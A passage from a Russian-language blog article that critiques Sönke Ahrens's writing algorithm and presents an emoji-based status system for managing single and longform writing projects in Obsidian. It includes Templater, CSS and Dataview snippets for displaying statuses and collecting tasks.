какое-то последовательное исследование, а потом на основе этого исследования делаю проект или исключает ситуации, когда я делаю проект, а потом под проект делаю исследования. В логике Зонке Аренса я сначала агрегирую заметки, а потом конвертирую их в проект (в конечный текст). Причём сам процесс агрегации ничем не ограничен и толком ничем не обоснован (это даже навевает мысль, что Зонке предлагает нам заняться коллекционированием и надеяться, что в какой-то момент нам повезёт и мы найдем то, что нас сильно зацепит). Я не хочу сказать, что Зонке не прав и в действительности такого не происходит. Просто сама мысль у него получилась кривая – т.е. я её не отрицаю, ибо у меня у самого так или иначе фоном постоянно происходит псевдослучайный процесс агрегации заметок, из которого потом появляется что-то связное и интересное.С шагами про черновик, вычитку и редактуру всё так. Тут не придерёшься, хех.Если что это не нападка на Зонке Аренса. Так-то я настоятельно рекомендую прочитать всем заметкоделам его книгу. Ибо сам-то я её внимательно прочёл и сделал по ней довольно большое количество полезных заметок.В качестве промежуточного решения проблемы алгоритма Зонке Аренса, я решил написать свой, несколько более расширенный алгоритм.Детализация этаповнаверхИтак, начнём-с.Написание небольшого количества первых заметок, которые нужны для формирования первоначального видения той или иной проблемы (мой алгоритм начинается с проблемы и формирования начального видения, а не с повседневных заметок) Это можно производить в рамках предварительного исследованияМожно собрать в одном месте и поверхностно обработать схожие по теме источники из всевозможных ""read later""Можно пройтись по уже имеющимся источникам/заметкам и попытаться дать оценку тому, что есть ли вообще релевантный материал в системе. Если есть, то можно создать мета-заметку и накидать туда соответствующих ссылокПостепенное формирование списка источников и заметок, которые в потенциале способны стать чем-то связанным и последовательным. И соответственно непосредственная обработка этих источников и заметок На этом этапе можно сформировать полноценную мета-заметку или сразу создать проектВ рамках мета-заметки или проекта нужно последовательно выкачивать из найденных источников заметки Логика для внешних источников Если источник мелкий и при этом оказался не шибко значимым, то можно просто ограничиться комментарием к нему (сделать отступ и написать коммент под внешней ссылкой)Если источник мелкий, но в нём есть полезные идеи, то создается обычная заметка, записывается в неё всё, что нужно, а сам источник указывается в качестве сноскиЕсли источник большой и его трудно разом обработать и при этом тут же обобщить в одну заметку, то создается log-заметка, в которой впоследствии выделяются и атомизируются наиболее значимые идеиЕсли источник огромный и в нём нужно довольно много всего изучить, то создается заметка-источник, внутри которой происходит разбиение на ряд log-заметокЛогика для внутренних источников Перейти на следующий этап, хех)Создание из полученных заметок связанных кластеров (например, с помощью иерархического списка, mindmap или canvas) и последующее написание по ним небольших кусочков текста В соответствии с поставленным задачами, гипотезами или проблемами ищутся наиболее подходящие заметки, которые сразу объединяются в кластерыДалее на основе этих кластеров пишутся небольшие, необязательно напрямую связанные между собой, текстыФормирование первого черновика – первая попытка написать связный текст Написанные кусочки текста в нужных местах склеиваются или наоборот разбиваются на логические замкнутые блоки (например, с помощью заголовков), благодаря чему формируется 1-ый драфтЕсли конечный текст предполагается очень большой, то возможно это будет просто 1-ый драфт какой-то определённой частиПроработка структуры / углубление в определённые части или главы текста (детализирование) / формирование дальнейшего плана действий при необходимости На этом этапе мы по сути делаем основную работу – пишем плюс-минус конечный текстПопеременно работаем то над текстом, то над его структурой. Попеременно значит раздельно, хехИз не самого очевидного. Пытаемся каждый логически связанный блок текста (например, связанный на уровне заголовка) сделать достаточно автономным, чтобы при необходимости этот кусок можно было перенести в другое место. Этот пункт нужен для того, чтобы сохранялась гибкость (об этом будет немного дальше)В процессе формализуем те или иные проблемы в виде задач и последовательно решаем ихВычитка своей работы и проведение критического обзора На этом этапе мы пытаемся оценить связность аргументов, а также логичность структуры отдельных частей или всего проектаПопеременно включаем, то писателя, чтобы отполировать те или иные формулировки или структуры, то критика, чтобы найти те или иные несостыковки, неточности и прочие проблемыЗа счёт неоднократной вычитки текста, пытаемся досвязать, доразвить, докомбинировать различные части нашего проектаПо-серьёзному задумываемся о том, что мы выбрали плодотворное направление, которое нас действительно волнует или, что мы действует уже из-за инерции, довольно жёсткой структуры или внешних нам неугодных требований Если нам нравится то, что мы делаем и мы видим в этом потенциал, то переходим на следующий этапЕсли мы чувствуем, что глобально движемся не туда куда хотим (нас раздирают сомнения или мы вообще не видим смысла в том, что делаем), то можно вернуться к самому первому этапу, чтобы поработать над какими-то другими, новыми проблемами. Или можно просто поработать над другими проектами. В общем делаем передышку, дабы немного охладеть к проекту и дабы подумать о том ""нужен ли он нам или есть занятия повеселее и поинтереснее""Не стоит забывать, что нам никто не запрещает забросить неугодные нам части проекта или создать новый проект и перенести в него только то, что у нас лучше всего получилось, дабы развивать только эти частиТакже не стоит забывать, что творчество в большинстве своём итеративный процесс – мы сначала довольно упорно пытаемся что-то сделать, потом анализируем результаты и потом снова пытаемся что-то сделатьМы старались сделать логически замкнутые блоки информации автономными для того, чтобы сохранить чувство контроля. Само же чувство контроля проистекает из нашей возможности сменить приоритеты и/или выбрать другой путь развития. Если мы не можем распараллелить наш проект или создать новый на основе кусков старого, то значит мы находимся в жёсткой системе, а это сулит тем, что рано или поздно мы можем потерять мотивациюМодификация структуры и проработка с помощью драфтов Переставляем части нашего проекта, если это необходимоДрафтим те куски, которые плохо вписываются в общую канву или стильДописываем все промежуточные, связывающие и вводные части, если это необходимостиФинализация, приведение проекта к конечному виду Работа с редакторами или рецензентами, если они есть. Допиливание через драфты, если это нужноРедактирование и исправление мелких ошибокФормирование служебных структурДоработка результатов под те или иные формальные требованияСоздание конечного проекта (файла)Публикация или просто донесение результатов своей работы до конечного потребителяАлгоритм хоть и выглядит как обобщённый, однако он написан по мотивам одного, не самого простого моего проекта.Наверное, вы сейчас подумали, что как-то уж чересчур детализировано получилось. На столько детализировано, что из-за большого количества деталей всё стало каким-то мутным. Однако не переживайте. Я написал этот алгоритм ни сколько для того, чтобы сделать его практичной альтернативой алгоритму Зонке Аренса, сколько для того, чтобы проиллюстрировать на сколько всё может быть сложнее и неоднороднее в действительности.Практичности же мы будем достигать с помощью системы статусов. К ней, без лишних слов, и перейдем.Система статусовнаверхСистема статусов выглядит вот так:структура статусовНа разных ОС по-разному отображаются эмодзи. Я лично использую Linux (Noto Color Emoji) и у меня они выглядят вот так.На интуитивном уровне вроде ничего сложного и удивительного, правда? Было бы даже странно, если система для проектов состояла из сюрпризов и неожиданностей. С другой стороны, не смотря на интуитивную понятность, именно эту систему я буду обсасывать с разных сторон на протяжении всей статьи.структура статусов- ⬛ abandoned
- Preparation 👀
	- 🟥 todo or queue
	- 💡 idea
- Preprocessing 🛠
	- 🧠 brainstorming
	- 🔎 research
- Processing ✍🏻
	- 🟦 wip
	- 📋 revising or structural improvements
	- 🖍 editing or critique
- Distributing 📨
	- 🟩 completed or pending distribution
	- 📦 preparation for distribution or compilation
	- 📢 distributedСтатусы у меня используются в виде эмодзи. Я также надеюсь, что удачно подобрал варианты слов, которые вы можете использовать вместо эмодзи. Однако я всё же настаиваю, чтобы вы тоже юзали эмодзи, ибо как бы это не выглядело по-детски, всё же с помощью эмодзи можно довольно ёмко и при этом, что приятно, визуально разметить ту или иную информацию. В статье, я надеюсь, что у меня получится доказать вышенаписанный тезис.Итак, начнём с того, что статусы условно делятся на четыре группы (дальше мы подробно рассмотрим каждый статус из каждой группы):Preparation 👀. Статусы, которые относятся к этой группе обозначают, что какие-то части проекта просто существуют, но в них ещё ничего толком нет. Иначе можно сказать, что части проекта, под статусами этой группы, обозначают лишь направления, в которые мы предположительно собираемся двигатьсяPreprocessing 🛠. Статусы этой группы говорят нам о том, что мы в той или иной части проекта подготавливаем или уже подготовили первичный материал, от которого будем отталкиваться и который будем развиватьProcessing ✍🏻. К этой группе относятся статусы, которые характеризуют основные стадии развития проектаDistributing 📨. Статусы характеризуют степень завершенности той или иной части проектаСтатусы я разбил на группы для того, чтобы была в принципе какая-то надсистема. Иначе говоря, если вы захотите поменять конкретные статусы или добавить новые, то можно будет сначала подумать о том, к какой группе (или какому, условного говоря, мета-процессу) относится статус.Конкретизация этапов работынаверхТеперь давайте конкретно обсудим, что значит каждый статус.⬛ abandoned – заброшено или заархивировано Этот статус можно поставить, если какая-то часть проекта нам перестала быть нужна по тем или иным причинамТакже его можно поставить в случаях, когда мы начали что-то развивать, но в процессе поняли, что у этого нет перспектив или нам в принципе неинтересно это двигать дальшеPreparation 👀 🟥 todo or queue – запланировано или находится в очереди Этот статус ставится на только что созданных частях проектаПо сути этот статус значит, что мы создали какое-то новое направление, которое хотим начать развиватьМожно также сказать, что этот статус значит, что у нас есть направление развития, но кроме него больше ничего и нет💡 idea – идея Этот статус обозначает, что мы написали несколько предложений или нарисовали простенькую схему, которые довольно ёмко объясняют, что, как или на основе чего мы собираемся развивать данную часть проектаPreprocessing 🛠 🧠 brainstorming - брейншторм или первый набросок Данный статус обозначает, что мы начали развивать первоначальную идею за счёт её расширения, детализации или накидывания новых, связанных идейЕщё этот статус может значить, что нам нужны какие-то ещё идеи, которые бы помогли решить тот или иной затык🔎 research - на этапе исследования Данный статус значит, что мы встретились с какими-то затруднениями и нам нужно провести какое-то дополнительное исследованиеТакже статус может значить, что у нас есть список источников и заметок, которые нам нужно обработать, чтобы продвинуть ту или иную часть проекта дальшеProcessing ✍🏻 🟦 wip – в процессе работы Статус значит, что мы находимся в процессе развития тех или иных конкретных идейПо сути этот статус значит, что мы нащупали верное направление и теперь просто совершаем последовательное движение📋 revising or structural improvements – пересмотр, вычитка или улучшение структуры Статус значит, что мы сделали, что хотели и теперь нам нужно пересмотреть, вычитать материал или нужно по-лучше проработать структуру (отрефакторить)🖍 editing or critique – редактирование или критический обзор Статус значит, что часть проекта находится в процессе (полноценного) редактированияТакже статус может значить, что нам нужно исправить какие-то ошибки или неточностиЕщё этим статусом можно обозначить части, которые готовы к тому, что их можно отправить редактору (если он есть) или что эти части можно показать другим людям, чтобы те дали обратную связь (критику)Distributing 📨 🟩 completed or pending distribution - готово или ожидает публикации Статус значит, что часть проекта полностью сделана и отредактирована📦 preparation for distribution or compilation - подготовка к распространению или компиляция Статус значит, что проект или часть проекта готовы к приведению или уже приводятся к тому виду или к тем правилам, которые есть у (платформы/журнала/сервиса/конференции/репозитория)Также этот статус может значить, что именно эту часть проекта нам нужно донести до конечного потребителя (своеобразная обратная альтернатива статусу ""⬛ abandoned"")📢 distributed – опубликовано, презентовано, распространено, законтребьютено Статус значит, что мы донесли результаты своей работы в необходимые местаДумаю, что вы уже смогли прочувствовать, что у статусов есть также логика развития: сначала мы вообще в принципе мало-мальски определяемся с тем, что собираемся делать и развивать; потом понемногу собираем свои мысли в кучу и при необходимости находим и изучаем те или иные материалы; далее осуществляем непосредственную основную работу; после анализируем полученные результаты и занимаемся корректировкой; когда всё готово, то мы подготавливаем материал к дистрибуции и непосредственно доносим его в нужные места.Кстати говоря, если вы прочитаете ещё раз длинный алгоритм, который я в начале статьи написал, то вы поймете, что система статусов так или иначе его формализует.Статусы в контексте проектанаверхТеперь давайте применим систему статусов непосредственно для проектов.Я буду рассматривать два вида проектовSingle-project – мелкий и одиночный проект (одна заметка = один проект)Longform-project – длинный и многосоставной проектДля формальности, давайте я покажу как на уровне файлов эти проекты выглядят.структура single-projectsSingle-project в структурном смысле имеет вот такой вид:- 📂 projects
	- 📝 project 1.md
	- 📝 project 2.md
	- ...Т.е. есть папка с проектами и в ней куча разных одиночных проектов.структура longform-projectsLongform-project в структурном смысле имеет вот такой вид:- 📂 projects
	- 📂 project 1
		- 👉 project 1.md (index)
		- 📜 scene 1.md
		- 📜 scene 2.md
		- ...
	- 📂 project 2
		- 👉 project 2.md (index)
		- 📜 scene 1.md
		- ...
	- 📂...
	- ...Т.е. есть папка с проектами и в ней для каждого longform-project выделена своя персональная папка. Также у каждого longform-project есть индексный файл, внутри которого указаны заметки (scenes), относящиеся к текущему проекту. Возможно, вы уже догадались, что такая логика и наименования взяты из плагина Longform и это не спроста (именно его я буду использовать для организации больших проектов).Можете заранее посмотреть гайд по этому плагину, если с ним не знакомы. Также есть автоматизированный способ создания подобных проектов.Теперь ещё одно уточнение. Для single-project и для индексного файла longform-project есть смысл использовать сокращённое количество статусов:⬛ abandoned - проект заброшен или заархивирован🟥 todo - проект просто запланирован🟦 wip - над проектов ведётся работа🟩 completed – проект закончен (проект ожидает дистрибуции)📢 distributed - проект опубликован/презентован/распространёнМетаданные для single-project или для индексного файла могут иметь вот такой вид:---
type: project
status: 🟩
---Полноценную же систему статусов мы натянем немного на другое.Single-projectнаверхСильно не буду вас томить. Идея в том, чтобы в начале каждого заголовка ставить статус. А потом просто открывать список с заголовками и анализировать его.table of contentsТеперь вы, я надеюсь, ощутили всю прикладную пользу эмодзиТак отображает заголовки core-плагин Outline. Есть также альтернативный и более функциональный плагин.Вы можете подумать о том как имплементировать систему статусов по-другому, однако мне кажется, что такой способ маркирования заголовков даёт возможность просто глазами увидеть и оценить сразу весь прогресс проекта. Т.е. не нужно кликать по всем заголовкам, чтобы понять как там обстоят дела. Более того, если запомнить примерную логику статусов, то можно весьма чётко понимать на какой именно стадии находится каждая часть проекта и при этом также примерно понимать, какие действия нужно делать дальше (о том как возвращаться к статусам будет чуть позже по тексту).К тому же, когда статусы интегрированы в заголовки, то можно оценить прогресс в контексте всей структуры проекта. Я раньше юзал всевозможные варианты канбан-досок, но у них есть проблема, что глядя на них, трудно сразу дать оценку по типу ""вот этот кусок проекта сейчас не очень актуален, я лучше вот эти части продвину вперёд"".Кстати говоря, откройте ещё раз скрин, который выше был. Я его сделал в момент, когда писал вот эти самые строчки, которые вы сейчас читаете. Вы можете заметить, что даже такая несложная статья как эта, пишется весьма нелинейным образом. И это даже не моя особенность. Линейно развивать проект или какой-либо текст в принципе крайне трудная и к тому же занудная задача – проще сначала поработать в одном месте, потом в момент затыка или угасания энтузиазма перейти на другую часть, потом снова на другую и т.д.. По сути именно в рамках последовательного переключения с одной части проекта на другую и выполняется весь объём работы. И нет, это не мультизадачность – это именно, что последовательное переключение. Сразу на этот счёт вспоминается Никлас Луман.Я никогда не заставляю себя делать то, чего мне не хочется. Всякий раз, когда я застреваю, я переключаюсь на что-то другое.Никлас ЛуманВот и мы как Луман не будем застревать и переключимся на что-то другое)Небольшая вспомогательная структуранаверхПорой в проекте удобно организовать небольшое закулисье, в котором мы можем сделать какую-то нужную нам работу, но которую не стоит отображать в конечном результате. Для подобных вещей можно использовать, например, вот такой статус ""⚙️"".⚙️ в контексте заголовкаВ пункте ""Какую ценность я хочу донести"" я объяснил самому себе в чём ценность подхода, который собираюсь раскрыть. А в ""Подборе и генерации графиков"" я заранее накидал графиков, чтобы было немного легче строить дальнейшие рассуждения.Можно, конечно, было без этих пунктов обойтись, но как бы, если я могу себе лишний раз помочь, то почему бы не сделать этого?⚙️ в контексте callout-блокаНапример, можно в callout скрыть ссылки и материалы, которые нам так или иначе помогли.Также в callout можно свернуть какую-то часть текста, которая нам просто перестала быть нужна.У меня эта критика относилась к алгоритму Зонке Аренса. Вы уже видели в начале её переписанную, но сглаженную форму, хах.Быстрый способ вставить статуснаверхНамеренно запоминать статусы весьма скучное занятие, поэтому можно сделать шаблон для templater, который будет выступать в роли подсказки. Шаблон можно повесить на хоткей и при его вызове будет появляться вот такое меню:подсказкаДалее жмакаете на нужный статус и он вставляется в заметку.код шаблона для templater<%*
const statuses = {
  '⬛': '⬛ abandoned',
  '⚙️': '⚙️ service structure',
  '🟥': '👀 | 🟥 todo or queue',
  '💡': '👀 | 💡 idea',
  '🧠': '🛠 | 🧠 blob or brainstorming',
  '🔎': '🛠 | 🔎 aggregation or research',
  '🟦': '✍🏻 | 🟦 wip',
  '📋': '✍🏻 | 📋 revising or improve structure',
  '🖍': '✍🏻 | 🖍 editing or critique',
  '🟩': '📨 | 🟩 completed or pending distribution',
  '📦': '📨 | 📦 preparation for distribution or compilation',
  '📢': '📨 | 📢 distributed',
}
const status = await tp.system.suggester(Object.values(statuses), Object.keys(statuses), true, 'Select status:')
-%><% status %>Longform-projectнаверхС длинными и многосоставными проектами поинтереснее.Во-первых, полноценную систему статусов я предлагаю использовать только на scenes (посмотрите ещё раз структуру longform-проекта, если забыли что за сцена такая).Во-вторых, я не вижу ни одной значимой причины для того, чтобы не использовать плагин Longform, хех.В-третьих, для scene я предлагаю использовать вот такой шаблон:scene template<% ""---"" %>
type: scene
status: 🟥
<% ""---"" %>

# Preprocessing
## Sources and notes

## Ideas and tasks

# Main textЗадачи выделены в отдельный блок, чтобы их можно было смотреть именно в текущей заметке, а не искать через индексную. Если вы хотите, то можете добавить сюда Dataview-запрос, который собирает задачи из текущей заметки (и который я покажу чуть позже).Можно также и более короткую версию шаблона использовать:<% ""---"" %>
type: scene
status: 🟥
<% ""---"" %>

# Preprocessing

# Main textПри необходимости мы можем также добавлять драфты в таком стиле:организация драфтов# Main text
## Draft 1

text text text

## Draft 2

text text text

## ...Шаблон для scene можно указать в настройках плагина Longform.выбор шаблона для проекта в плагине LongformОсновная идея в том, что мы теперь формально разграничиваем (на уровне заголовков) процесс исследования и процесс написания конечного текста в рамках одной части проекта. Это по сути значит, что мы можем сначала долго и внимательно поизучать какую-то тему, собрать множество материалов и заметок, провести исследование, наклепать прототипов, сделать нужные нам эксперименты, суммаризировать результаты, а потом на основе всего этого сделать конечную работу (написать конечный текст), причём всё это будет происходить в одной заметке (в одной части проекта).Потом мы вышенаписанное можем сделать для другой части проекта, потом также для следующей и т.д. В самом конце у нас должен получиться развесистый проект, который будет в себе содержать вообще всё: взаимосвязанные между собой заметки с полезными идеями; источники; правки редактора (если он есть); лог наших действий и размышлений; иллюстрации, схемы, canvases; планы работ по конкретным частям; несколько вариаций (драфтов) текста. Когда нам будет нужно донести свои результаты до других, то мы просто пропылесосим из всех частей проекта полученные результаты и скомпилируем из них конечный продукт.Вы, наверное, сейчас немного в замешательстве, ибо не понимаете как можно ёмко отразить все сложные процессы исследования, прототипирования, написания и т.п. Вообще говоря... Точно также как и для single-project, только теперь структуру и статусы нам будет отображать плагин Longform:longform-projectЯ убавил немного яркость эмодзи, чтобы структура стала чуть более разборчивой. В обычных заголовках, конечно, так не получится сделать.Как настроить такое же отображение будет объяснено далее.Supercharged links и иконки в плагине LongformнаверхНапомню, что сцену задают вот такие метаданные:---
type: scene
status: 🟥
---Для того, чтобы у сцены появился статус перед названием заметки, можно использовать Supercharged Links. Чуть позже я покажу, где нам это пригодится. Вы можете вручную сопоставить статус и type: scene в настройках плагина. Однако есть чуть более автоматизированный способ это сделать. Можно создать сниппет вот с таким содержанием:supercharged-links-manual.css.data-link-icon[data-link-type*=""scene"" i]::before {
  content: attr(data-link-status) "" "";
}Так у сцены всегда будет отображаться иконка с любым статусом, который вы укажете в метаданных.А вот, чтобы в плагине Longform появилось отображение иконок, придется всё вручную указать (или я просто не понял как это сделать более коротким способом):longform.cssbody {
  --longform-status-opacity: 0.3;
  --longform-status-padding: 0 2px 0 0;
}

[data-scene-status~=""⬛""]::after {
  content: ""⬛"";
  opacity: var(--longform-status-opacity);
  padding: var(--longform-status-padding);
}

[data-scene-status~=""⚙️""]::after {
  content: ""⚙️"";
  opacity: var(--longform-status-opacity);
  padding: var(--longform-status-padding);
}

[data-scene-status~=""🟥""]::after {
  content: ""🟥"";
  opacity: var(--longform-status-opacity);
  padding: var(--longform-status-padding);
}

[data-scene-status~=""💡""]::after {
  content: ""💡"";
  opacity: var(--longform-status-opacity);
  padding: var(--longform-status-padding);
}

[data-scene-status~=""🧠""]::after {
  content: ""🧠"";
  opacity: var(--longform-status-opacity);
  padding: var(--longform-status-padding);
}

[data-scene-status~=""🔎""]::after {
  content: ""🔎"";
  opacity: var(--longform-status-opacity);
  padding: var(--longform-status-padding);
}

[data-scene-status~=""🟦""]::after {
  content: ""🟦"";
  opacity: var(--longform-status-opacity);
  padding: var(--longform-status-padding);
}

[data-scene-status~=""📋""]::after {
  content: ""📋"";
  opacity: var(--longform-status-opacity);
  padding: var(--longform-status-padding);
}

[data-scene-status~=""🖍""]::after {
  content: ""🖍"";
  opacity: var(--longform-status-opacity);
  padding: var(--longform-status-padding);
}

[data-scene-status~=""🟩""]::after {
  content: ""🟩"";
  opacity: var(--longform-status-opacity);
  padding: var(--longform-status-padding);
}

[data-scene-status~=""📦""]::after {
  content: ""📦"";
  opacity: var(--longform-status-opacity);
  padding: var(--longform-status-padding);
}

[data-scene-status~=""📢""]::after {
  content: ""📢"";
  opacity: var(--longform-status-opacity);
  padding: var(--longform-status-padding);
}Такую возможность добавили недавно. Кстати, если вы знаете как более ёмко написать сниппет, то напишите об этом в комментариях.Если вы хотите быстро менять статусы у сцен, то есть смысл использовать для этого плагин Metadata Menu. Вроде бы есть даже весьма неплохие гайды на него (гайд 1, гайд 2). Можете также моё демо-хранилище потыкать, ибо там этот плагин используется как основной. Правда не для сцен, но тоже весьма схожих вещей.Надеюсь, что к данному моменту вы прям прочувствовали всё удобство эмодзи)Ну, всё. Немного технически подкрутили систему, теперь давайте обсудим ещё один важный процесс.Как возвращаться к статусамнаверхИдея вот в чём. Если сопоставить статус с какими-то конкретными вопросами, то за счёт этого можно весьма легко и быстро восстанавливать вовлечённость в проект (например, после долгого перерыва).Логика в общем такая. Вы смотрите на название части проекта и статус, а дальше в соответствии со статусом задаёте себе определённые вопросы.Preparation 👀 🟥 todo Есть ли у меня идея (в виде текста, иллюстрации или схемы), которая могла бы ёмко отразить суть того, что я хочу сделать/развить?💡 idea (тут всё же придется открыть эту часть проекта и прочитать в чём заключается идея, если мы её изначально забыли)Появились ли у меня новые мысли или заметки, которые могли бы развить эту идею?Мне сейчас интересно развивать эту идею дальше?Preprocessing 🛠 🧠 brainstorming Могу ли я дополнить или расширить данную часть проекта какими-то новыми идеями или деталями?Могу ли я уже начать пытаться полноценно раскрывать (превращать во что-то последовательное) найденные идеи?(Если к этому статусу часть проекта пришла из других более высоких статусов) Могу ли я набросать хотя бы намётки решения, чтобы (продвинуть проект дальше/решить затык)?🔎 research Есть ли у меня желание поизучать сторонние или внутренние источники, чтобы найти или добыть нужные мне (знания/решения/случаи/примеры/теории/модели)?Есть ли у меня желание в том, чтобы (поэкспериментировать/создать прототип(ы)/смоделировать что-либо/верифицировать/суммаризировать результаты своего исследования)?Processing ✍🏻 🟦 wip Готов или интересно ли мне развивать дальше эту часть проекта?Что мне нужно ещё доработать в этой части, чтобы довести до какого-то конечного и логически замкнутого результата? Что мне нужно сделать, чтобы присвоить этой части следующий статус?📋 revising or improve structure Есть ли у меня желание заняться вычиткой данной части проекта?Что я могу отрефакторить, чтобы улучшить конечный результат?🖍 editing or critique Что я могу исправить или дошлифовать в этой части проекта?Эта часть проекта находится в логичном месте или её стоит переместить?Эта часть проекта (решает поставленные задачи/решает те или иные проблемы/является ли содержательной/имеет логические или фактические ошибки/имеет уникальные или просто полезные результаты/хорошо ли раскрывает те или иные идеи)?Могу ли эту часть проекта отдать в редактуру или на рецензирование?Distributing 📨 🟩 completed or pending distribution Нужно ли эту часть как-то компилировать или подводить под какие-то правила?📦 preparation for distribution or compilation Есть ли у меня желание собрать эту часть проекта в конечный вид?📢 distributed Я просто красавчик или красавица. Тут без вопросов.Логику вопросов можно также использовать, когда есть сомнения в том, какой статус стоит присвоить. Типа, например, если часть проекта имеет несколько набросков, то и как бы отрефакторить, дополировать или покритиковать будет нечего. Следовательно можно сразу сказать, что статус будет явно ниже ""📋 revising"". А там как бы небольшой размах будет из того, что можно выбрать, хех.Нелинейность как возможностьнаверхПомните я в начале сказал, что алгоритм Зонке Аренса не отражает нелинейность написания текста? Вы вероятно могли заметить, что и мой алгоритм лишь отчасти показывает это. Статусы же, естественно, решают эту проблему.Я для вас ранее уже акцентировал на примере статусов для этой статьи, что даже простой проект может развиваться нелинейно. Однако с помощью статусов можно показать ещё более глубокую нелинейность.Допустим, что мы дотащили ту или иную часть проекта до ""📋 revising"". И вдруг так получилось, что на этом этапе мы узнали на сколько много ошибок сделали и вообще какое огромное количество вещей не учли. Также положим, что нам не хватает знаний, чтобы все найденные проблемы решить. Что в таком случае можно сделать? Как вариант сформировать проблемы в виде задач, а сам блок информации пометить, что он теперь на этапе ""🔎 research"". Тут почему-то мне хочется сказать как в комиксах: ""Bam!"".Давайте ещё один пример. Положим, что часть проекта находится на этапе ""📦 compilation"", т.е. мы прям уже на финишной прямой. Однако, в процессе формирования конечного файла, мы заметили, что у нас какие-то urls битые, а какие-то ссылки (сноски) вообще неправильно оформлены. Что можно сделать? Как вариант оставить задачу в стиле ""поправить такие-то и такие-то ссылки"" и поставить метку у части проекта, что она теперь на этапе ""🖍 editing"". Когда будет настроение, мы эти проблемы исправим, а пока что можно отложить процесс компиляции и поработать над другой частью проекта.Получается идея в том, что статусы можно менять в любом направлении. Нужно накидать каких-то решений? Ставим ""🧠 brainstorming"". Нужно проверить на ошибки или сделать критический обзор – ""🖍 editing"". Нужно поработать над самим текстом и его структурой – ""📋 revising"". Логика, я думаю, ясна.Дополнительный контекст для задачнаверхСтатусы бонусом дают возможность видеть контекст задач. НапримерЕсли задача сейчас находится в месте, где проект ""🟦 wip"", то это по сути значит, что нам нужно просто продолжать развивать какие-то идеиЕсли задача находится в ""🧠 brainstorming"", то значит нам нужно набросать ещё каких-то идей по какой-то определённой теме или накидать набросок предполагаемого решенияЕсли на стадии ""🔎 research"", то вероятно найти или обработать какие-то источники, чтобы решить определённую проблемуЕстественно, что тыкать в каждую часть проекта и выискивать в них задачи не обязательно. Можно всё собрать в одном месте:сбор задач из single-projectЗапрос на задачи я поместил в скрывающийся callout-блок.Т.е. можно в начале проекта агрегировать все задачи из текущего проекта. Мне кажется так делать очень удобно, ибо когда проектов не один, то хочется порой просто пробежаться по определённым проектам, чтобы посмотреть есть ли какие-то проблемы, которые мы можем или хотим решить.Чтобы получить задачи из текущего файла и чтобы сгруппировать их по заголовкам, можно сделать вот такой Dataview-запрос:```dataview
TASK
WHERE file.link = this.file.link
GROUP BY meta(section).subpath
```сбор задач из longform-projectСлева индексная заметка, справа плагин Longform.Чтобы статус сцены отображался в Dataview-запросе, мы использовали Supercharged Links. Благодаря этому, мы добились, так скажем, единообразия)Собрать задачи для longform-project можно вот так:```dataviewjs
const scenes = dv
  .pages(`""${dv.current().file.folder}""`)
  .where((p) => p.file.link != dv.current().file.link);

dv.taskList(scenes.file.tasks);
```Данный запрос используется в индексной заметке и собирает задачи он из файлов текущей директории (т.е. директории индексного файла).В качестве бонуса. Если вы хотите сгруппировать сцены по их статусам, то можно это сделать, например, вот так:группировка сцен по статусам```dataviewjs
const pages = dv
  .pages(`""${dv.current().file.folder}""`)
  .where((p) => !dv.func.contains(p.file.link, dv.current().file.link));
const groups = pages.groupBy((p) => p.status);

// определение порядка группировки
const statuses = [""⬛"", ""⚙️"" ,""🟥"", ""💡"", ""🧠"", ""🔎"", ""🟦"", ""📋"", ""🖍"", ""🟩"", ""📦"", ""📢""];

for (
  let group of groups.sort(
    (a, b) => statuses.indexOf(a.key) - statuses.indexOf(b.key),
  )
) {
  dv.header(4, ""STATUS: "" + group.key);
  group.rows.forEach((row) => dv.paragraph(row.file.link));
}
```В принципе, при небольшом старании, можно будет вдобавок отобразить задачи из каждой сцены.Хотел бы подсветить одну важную мысль. Если так получается, что мы какую-то часть проекта понижаем в прогрессе (меняем, например, с ""📋 revising"" на ""🧠 brainstorming""), то нужно прям написать задачу, в которой будет достаточно информации, чтобы понять из-за чего такой downgrade произошёл. Это нужно, чтобы позже не возникло ощущения замешательства, мол почему я сделал так много и вроде даже уже результат есть, а статус находится на уровне ""накидывания идей"".Основная цельнаверхОсновная цель – завершить проект. Но это как бы и так понятно. Если говорить в рамках статусов, то конечная цель может заключается, например, в том, чтобы сначала довести проект примерно до такого ""зелёного"" состояния:🟩 completedКак видите, не всегда получается довести что-то до конца и это приходится по итогу забрасыватьДалее же спокойно компилируются полученные результаты в один общий результат. Ну, а потом каждый двигается кому куда надо.Мелкие дополнениянаверхПроект может делаться, например, в течение 3-ёх лет, а в конце компилироваться за 2 недели. Вопрос. Есть ли смысл в таком случае оптимизировать процесс компиляции? Это вопрос риторический и адресован он ""великим"" оптимизаторам (точнее прокрастинаторам).Напомню, что в Obsidian есть чертовски удобный core-плагин Workspaces. В нём можно сохранять разные конфигурации панелей и открытых заметок. Это прям ужас как сильно оптимизирует многие процессы.Поощрительная (игровая) составляющая в системе статусов, конечно, присутствует: мол приятно поменять статус с более низкого уровня, на более высокий. Однако всё же основная польза статусов проявляется на больших дистанциях, когда в процессе появляются временные разрывы и из-за которых появляется потребность в восстановлении вовлечённости и прогресса.ЗаключениенаверхЧто алгоритм Зонке Аренса, что мой алгоритм, что предложенная система статусов не являются достаточно универсальными. Более того, все эти структуры, наверное, с большим трудом или вообще не получится натянуть на ситуации, которые подразумевают сложные коллаборации с другими людьми или предполагают чрезмерно большие и при этом раздробленные (например, на разные отделы) проекты. Такое ограничение проистекает хотя бы из той мысли, что ни алгоритмы, ни статусы не подразумевают какой-то жесткой последовательности или жесткой проверки на соответствие различным стандартам.Не смотря на то, что статья получилась весьма длинной, я надеюсь, что вы смогли по достоинству оценить лаконичность самого подхода: мы формируем структуру (в виде заголовков в проекте или заметок в плагине Longform) и тут же на эту структуру натягиваем систему статусов. У нас получается сразу и наглядность, которую дают заголовки, и наглядность, которую формируют статусы. Лично у меня такая синергия вызывает только восторг.Пожалуй, стоит сказать и про сам объём текущей статьи. Во-первых, теперь вы увидели как я пишу подобные статьи и вероятно теперь понимаете откуда берётся объём. Во-вторых, я и хочу, чтобы они были увесистыми, ибо я же пишу как никак для сурьёзных заметкоделов, хах.P.S. На статью меня вдохновил непосредственно Зонке Аренс и его алгоритм. Логику статусов же я частично украл из этого хранилища.На этом у меня всё.Задать вопрос или как-то расширить эту статью своим комментарием, вы также можете в telegram-канале. Если статья принесла вам пользу и вы в ответ хотите выразить свою благодарность в материальном виде, то можете сделать это вот тут или с помощью кнопки ""Задонатить"" (смотрите ниже).",2024-01-26
